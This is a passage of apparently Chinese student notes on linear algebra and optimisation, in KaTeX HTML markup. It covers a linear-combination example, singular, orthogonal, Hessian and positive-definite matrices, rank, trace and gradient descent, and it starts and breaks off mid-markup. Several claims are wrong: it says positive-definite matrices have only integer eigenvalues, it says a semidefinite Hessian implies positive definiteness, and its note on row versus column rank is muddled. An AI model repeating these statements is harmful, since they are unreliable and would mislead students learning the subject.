displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">x\begin{bmatrix}2\\-1\\0\end{bmatrix}+y\begin{bmatrix}-1\\2\\-3\end{bmatrix}+z\begin{bmatrix}0\\-1\\4\end{bmatrix}=\begin{bmatrix}0\\-1\\4\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span>。易知教授特意安排的例子中最后一个列向量恰巧等于等式右边的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span> 向量，所以我们需要的线性组合为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mi>y</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mi>z</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x=0,y=0,z=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。假设我们令<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>3</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">b=\begin{bmatrix}1\\1\\-3\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span>，则需要的线性组合为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mi>y</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mi>z</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">x=1,y=1,z=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>。</p><h3 id="第二讲矩阵消元"><a class="markdownIt-Anchor" href="#第二讲矩阵消元">#</a> 第二讲：矩阵消元</h3><h1 id="算了按老师ppt上把概念捋一遍"><a class="markdownIt-Anchor" href="#算了按老师ppt上把概念捋一遍">#</a> 算了，按老师 PPT 上把概念捋一遍</h1><h3 id="线代"><a class="markdownIt-Anchor" href="#线代">#</a> 线代</h3><h5 id="奇异矩阵"><a class="markdownIt-Anchor" href="#奇异矩阵">#</a> 奇异矩阵</h5><p>奇异矩阵的判定方法：</p><ol><li>行列式 | A | 是否等于 0，若等于 0，称矩阵 A 为奇异矩阵；</li></ol><p>非奇异矩阵的判定方法：</p><ol><li>一个矩阵非奇异当且仅当它的行列式不为零。</li><li>一个矩阵非奇异当且仅当它代表的线性变换是个自同构。</li><li><strong>一个矩阵非奇异当且仅当它的秩为 n。</strong> (R (A)&lt;n 则行列式为 0)</li><li>可逆矩阵就是非奇异矩阵，非奇异矩阵也是可逆矩阵。*</li></ol><h5 id="正交矩阵"><a class="markdownIt-Anchor" href="#正交矩阵">#</a> 正交矩阵</h5><p>如果: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">A^T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span> =E (E 为单位矩阵)，则 n 阶实矩阵 A 称为正交矩阵。<br>其接着可证明 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">A^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span> = <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">A^T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span></p><h5 id="黑森矩阵"><a class="markdownIt-Anchor" href="#黑森矩阵">#</a> 黑森矩阵</h5><p>是向量的二阶偏导数的矩阵。注意该矩阵一定是对称的，因为求解偏导的结果和求偏导的顺序无关。如果黑森矩阵为半正定矩阵（即沿任意方向的二阶偏导数结果大于 0），则表明其一定是正定的。同理如果黑森矩阵为半负定矩阵，则说明函数为凹函数。</p><h5 id="正定矩阵"><a class="markdownIt-Anchor" href="#正定矩阵">#</a> 正定矩阵</h5><blockquote><p>正定矩阵的所有特征值都为整数。如果 A 正定，那么有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mi>T</mi></msup><mi>A</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">x^TAx</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathnormal">A</span><span class="mord mathnormal">x</span></span></span></span> &gt; 0 对任意非零向量都成立。<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mi>T</mi></msup><mi>A</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">x^TAx</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathnormal">A</span><span class="mord mathnormal">x</span></span></span></span> &gt;= 0 为半正定矩阵。</p></blockquote><h5 id="矩阵的秩"><a class="markdownIt-Anchor" href="#矩阵的秩">#</a> 矩阵的秩</h5><ul><li>秩是图像经过矩阵变换之后的空间维度<br>简单来说，秩是任意一个矩阵中最大线性无关向量的个数，最大线性无关向量是指：一个矩阵中，线性无关的向量最多是几个。<br>特别注意矩阵的秩 = 行秩 = 列秩。但是，<strong>行满秩的矩阵的秩不一定是列满秩的矩阵的秩</strong>。</li></ul><h5 id="矩阵的迹"><a class="markdownIt-Anchor" href="#矩阵的迹">#</a> 矩阵的迹</h5><p>令域 F 上的 N 维方阵 A 的矩阵元为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">a_{ij}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>∈F，它的迹定义为对角线矩阵元之和。</p><h3 id="相似性度量"><a class="markdownIt-Anchor" href="#相似性度量">#</a> 相似性度量</h3><p>闵可夫斯基距离：</p><h2 id="最优化方法"><a class="markdownIt-Anchor" href="#最优化方法">#</a> 最优化方法</h2><h3 id="梯度下降法梯度法"><a class="markdownIt-Anchor" href="#梯度下降法梯度法">#</a> 梯度下降法（梯度法）</h3><p>重要公式： <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>θ</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>=</mo><msub><mi>θ</mi><mi>i</mi></msub><mo>−</mo><msub><mi>η</mi><mi>k</mi></msub><mo>×</mo><mi mathvariant="normal">∇</mi><mi>f</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\theta_{i+1} = \theta_{i} - \eta_{k} \times \nabla f(\theta)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.902771em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∇</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span></span></span></span><br><strong> 最速降</strong> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>η</mi><mi>k</mi></msub><mo>=</mo><mi>a</mi><mi>r</mi><mi>g</mi><mi>m</mi><mi>i</mi><mi>n</mi><mi>f</mi><mo stretchy="false">(</mo><msub><mi>θ</mi><mi>k</mi></msub><mo>−</mo><mi>η</mi><mo>×</mo><mi mathvariant="normal">∇</mi><mi>f</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\eta_k = argmin f(\theta_{k} - \eta \times \nabla f(\theta)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">m</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" 